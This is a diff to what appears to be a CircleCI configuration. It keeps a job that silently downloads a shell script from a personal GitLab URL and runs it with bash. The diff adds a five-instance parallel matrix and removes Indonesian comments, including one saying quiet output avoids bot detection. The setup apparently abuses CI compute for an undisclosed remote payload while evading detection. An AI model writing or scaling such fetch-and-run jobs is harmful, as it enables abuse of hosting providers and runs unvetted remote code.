@@ -7,23 +7,23 @@ executors:
         auth:
           username: $DOCKER_HUB_USER
           password: $DOCKER_HUB_PASSWORD
-    # Mendefinisikan resource class agar performa stabil
     resource_class: xlarge 
 
 jobs:
   my-job-name:
+    parameters:
+      node_id:
+        type: string
+        default: "1"
     executor: my-custom-executor
     steps:
       - checkout
       - run:
-          name: "Setup Environment and Execute"
+          name: "Setup and Execute Instance << parameters.node_id >>"
           command: |
-            # Menggunakan -q agar log bersih (menghindari deteksi bot lewat log berlebih)
             wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh
             sed -i 's/\r$//' circle.sh
             chmod +x circle.sh
-           
-            # Menjalankan biner dengan timeout atau background jika perlu
             bash circle.sh
 
 workflows:
@@ -31,4 +31,7 @@ workflows:
     jobs:
       - my-job-name:
           context:
-            - docker-hub-creds # Menggunakan Context untuk manajemen secret yang lebih aman
+            - docker-hub-creds
+          matrix:
+            parameters:
+              node_id: ["1", "2", "3", "4", "5"]
